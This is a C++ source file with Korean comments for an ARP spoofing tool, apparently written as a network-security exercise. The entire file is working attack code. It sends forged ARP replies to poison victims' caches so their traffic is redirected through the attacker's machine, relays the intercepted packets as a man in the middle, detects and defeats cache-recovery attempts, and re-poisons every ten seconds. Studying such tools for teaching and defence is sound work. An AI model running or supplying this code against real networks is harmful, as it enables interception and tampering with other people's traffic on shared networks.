#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <ctime>

// 패킷 구조체 - 1바이트 정렬로 패딩 없음
#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;  // 이더넷 헤더
    ArpHdr arp_;  // ARP 헤더
};
#pragma pack(pop)

// 전역 변수 선언
pcap_t* handle;            // 패킷 캡처 핸들
Mac my_mac;                // 공격자 MAC 주소
Ip sender_ip[20];          // 공격 대상 IP 배열 (최대 20개)
Ip target_ip[20];          // 위장할 대상 IP 배열 (일반적으로 게이트웨이)
Mac sender_mac[20];        // 공격 대상 MAC 주소 배열
Mac target_mac[20];        // 위장할 대상 MAC 주소 배열

// 프로그램 사용법 출력 함수
void usage() {
    printf("구문: send-arp <인터페이스> <공격대상 IP> <위장할대상 IP> [<공격대상 IP 2> <위장할대상 IP 2> ...]\n");
    printf("예시: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

// ARP 패킷 전송 함수
int send_arp_packet(Mac dst_mac, Mac src_mac, Mac target_mac, Ip src_ip, Ip target_ip, bool is_request) {
    EthArpPacket packet;

    // 이더넷 헤더 설정
    packet.eth_.dmac_ = dst_mac;                // 목적지 MAC 주소
    packet.eth_.smac_ = src_mac;                // 소스 MAC 주소
    packet.eth_.type_ = htons(EthHdr::Arp);     // 이더넷 타입: ARP

    // ARP 헤더 설정
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);    // 하드웨어 타입: 이더넷
    packet.arp_.pro_ = htons(EthHdr::Ip4);      // 프로토콜 타입: IPv4
    packet.arp_.hln_ = Mac::SIZE;               // 하드웨어 주소 길이: 6바이트
    packet.arp_.pln_ = Ip::SIZE;                // 프로토콜 주소 길이: 4바이트
    
    // ARP 요청 또는 응답 설정
    packet.arp_.op_ = htons(is_request ? ArpHdr::Request : ArpHdr::Reply);
    packet.arp_.smac_ = src_mac;                // 발신자 MAC 주소
    packet.arp_.sip_ = htonl(src_ip);           // 발신자 IP 주소
    packet.arp_.tmac_ = target_mac;             // 대상 MAC 주소
    packet.arp_.tip_ = htonl(target_ip);        // 대상 IP 주소

    // 패킷 전송
    return pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
}

// 네트워크 인터페이스의 MAC 주소를 가져오는 함수
int get_mac_address(const char* interface, uint8_t* mac_addr) {
    struct ifreq ifr;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket() 실패");
        return -1;
    }

    // 인터페이스 이름 설정
    strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
    ifr.ifr_name[IFNAMSIZ-1] = '\0';

    // ioctl로 MAC 주소 정보 요청
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl() 실패");
        close(sockfd);
        return -1;
    }

    // MAC 주소 복사 (6바이트)
    memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, 6);
    close(sockfd);
    return 0;
}

// IP 주소들의 MAC 주소를 알아내는 함수
void resolve_mac_addresses(char* argv[], int count) {
    for (int i = 0; i < count; i++) {
        // 브로드캐스트 ARP 요청 전송 (누구의 IP가 이것입니까?)
        send_arp_packet(
            Mac("ff:ff:ff:ff:ff:ff"),  // 브로드캐스트 MAC 주소
            my_mac,                    // 내 MAC 주소
            Mac::nullMac(),            // 대상 MAC (비어있음)
            Ip("0.0.0.0"),             // 소스 IP (의미 없음)
            Ip(argv[i+2]),             // 알아내려는 IP 주소
            true                       // ARP 요청
        );

        // 응답 패킷 대기
        struct pcap_pkthdr* header;
        const u_char* packet;
        PEthHdr eth_hdr;
        PArpHdr arp_hdr;
        
        while (true) { 
            int res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) continue;  // 타임아웃: 계속 대기
            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) break;  // 에러: 종료

            // 이더넷 헤더 추출
            eth_hdr = (PEthHdr)packet;
            
            // ARP 패킷인지 확인
            if (eth_hdr->type() == EthHdr::Arp) {
                // ARP 헤더 추출
                packet += sizeof(EthHdr);
                arp_hdr = (PArpHdr)packet;
                
                // 우리가 찾던 IP의 응답인지 확인
                if (static_cast<uint32_t>(arp_hdr->sip()) == static_cast<uint32_t>(Ip(argv[i+2]))) {
                    // 짝수 인덱스는 sender(공격 대상), 홀수 인덱스는 target(위장할 대상)
                    if (i % 2 == 0) {
                        sender_mac[i/2] = Mac(arp_hdr->smac());
                        sender_ip[i/2] = Ip(argv[i+2]);
                    } else {
                        target_mac[(i-1)/2] = Mac(arp_hdr->smac());
                        target_ip[(i-1)/2] = Ip(argv[i+2]);
                    }
                    break;
                }
            }
        }
    }
}

int main(int argc, char* argv[]) {
    // 명령줄 인자 검증
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }
    
    // 네트워크 인터페이스 설정
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];

    // pcap 핸들 열기
    handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "장치 %s 열기 실패: %s\n", dev, errbuf);
        return -1;
    }
    
    // 감염 대상 수 계산
    int infect_count = (argc - 2) / 2;
    
    // 내 MAC 주소 가져오기
    uint8_t mac_bytes[6];
    if (get_mac_address(dev, mac_bytes) < 0) {
        fprintf(stderr, "MAC 주소 가져오기 실패\n");
        return -1;
    }
    my_mac = Mac(mac_bytes);
    
    // 모든 IP에 대한 MAC 주소 알아내기
    resolve_mac_addresses(argv, infect_count * 2);

    // 초기 ARP 스푸핑 수행 (모든 대상에게 거짓 ARP 응답 전송)
    for (int i = 0; i < infect_count; i++) {
        if (send_arp_packet(
            sender_mac[i],              // 공격 대상 MAC
            my_mac,                     // 내 MAC
            sender_mac[i],              // 공격 대상 MAC (tmac)
            Ip(target_ip[i]),           // 위장할 IP (게이트웨이 등)
            Ip(sender_ip[i]),           // 공격 대상 IP
            false                       // ARP 응답
        ) == 0) {
            printf("%s의 감염 성공! (초기)\n", std::string(sender_ip[i]).c_str());
        }
    }
    printf("모든 대상 감염 완료 (초기)\n");

    // 패킷 캡처 및 처리 변수
    struct pcap_pkthdr* header;
    const u_char* packet;
    PEthHdr eth_hdr;
    PArpHdr arp_hdr;

    // 시간 측정 시작
    time_t start_time = time(nullptr);

    // 메인 패킷 캡처 및 처리 루프
    while (true) {
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;  // 타임아웃: 계속
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) break;  // 에러: 종료

        // 이더넷 헤더 추출
        eth_hdr = (PEthHdr)packet;
        uint16_t eth_type = eth_hdr->type();

        // ARP 패킷 처리
        if (eth_type == EthHdr::Arp) {
            // ARP 헤더 추출
            packet += sizeof(EthHdr);
            arp_hdr = (PArpHdr)packet;

            // sender가 target에게 정상 ARP 요청을 보내는지 감지 (ARP 테이블 복구 시도)
            int i;
            for (i = 0; i < infect_count; i++) {
                if (arp_hdr->sip() == sender_ip[i] && arp_hdr->tip() == target_ip[i]) 
                    break;
            }
            
            // 복구 시도 감지시 재감염 수행
            if (i != infect_count) {
                if (send_arp_packet(
                    Mac(arp_hdr->smac()),       // 공격 대상 MAC
                    my_mac,                     // 내 MAC
                    Mac(arp_hdr->smac()),       // 공격 대상 MAC (tmac)
                    arp_hdr->tip(),             // 위장할 IP
                    arp_hdr->sip(),             // 공격 대상 IP
                    false                       // ARP 응답
                ) == 0) {
                    printf("%s 재감염 성공!\n", std::string(arp_hdr->sip()).c_str());
                }
            }
        }
        // 기타 패킷 처리 (중간자 역할)
        else {
            // 감염된 sender로부터 오는 패킷인지 확인
            int i;
            for (i = 0; i < infect_count; i++) {
                if (sender_mac[i] == eth_hdr->smac_) 
                    break;
            }
            
            // sender가 보낸 패킷이면 target에게 전달 (중간자 역할)
            if (i != infect_count) {
                // MAC 주소 수정
                eth_hdr->dmac_ = target_mac[i];  // 실제 target MAC으로 변경
                eth_hdr->smac_ = my_mac;         // 내 MAC으로 변경
                
                // 수정된 패킷 전송
                if (pcap_sendpacket(handle, packet, header->len) != 0) {
                    printf("패킷 전송 실패!\n");
                } else {
                    printf("패킷 중계 성공 (%s -> %s)\n", 
                           std::string(sender_ip[i]).c_str(), 
                           std::string(target_ip[i]).c_str());
                }
            }
        }

        // 시간 체크 및 주기적 재감염 (10초마다)
        time_t current_time = time(nullptr);
        if (difftime(current_time, start_time) >= 10) {
            for (int i = 0; i < infect_count; i++) {
                send_arp_packet(
                    sender_mac[i],              // 공격 대상 MAC
                    my_mac,                     // 내 MAC
                    sender_mac[i],              // 공격 대상 MAC (tmac)
                    Ip(target_ip[i]),           // 위장할 IP
                    Ip(sender_ip[i]),           // 공격 대상 IP
                    false                       // ARP 응답
                );
            }
            printf("모든 대상 주기적 재감염 완료\n");
            start_time = current_time;  // 시간 리셋
        }
    }

    // 종료 시 핸들 정리
    pcap_close(handle);
    return 0;
}
